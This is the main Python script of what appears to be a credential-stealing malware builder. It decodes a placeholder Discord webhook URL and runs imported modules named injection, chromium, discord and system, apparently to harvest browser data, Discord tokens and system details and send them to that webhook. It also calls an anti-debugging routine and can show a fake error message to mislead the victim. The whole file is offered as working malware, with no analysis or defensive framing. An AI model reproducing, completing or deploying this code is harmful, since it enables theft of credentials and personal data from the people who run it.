from util.chromium import *
from util.debug import *
from util.discord import *
from util.fakeerror import *
from util.injection import *
from util.sysinfo import *

__WEBHOOK__ = __import__("base64").b64decode("&WEBHOOK_URL_ENC&").decode("utf-8")

__USE_ERROR_MESSAGE__ = False
__ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode("utf-8")

def main(webhook: str) -> None:   
    debug()
     
    funcs = [
        injection,
        chromium,
        discord,
        system,
    ]

    for func in funcs:
        func(webhook)
    
    if __USE_ERROR_MESSAGE__:
        fake_error(__ERROR_MESSAGE__)

if __name__ == "__main__":
    main(__WEBHOOK__)
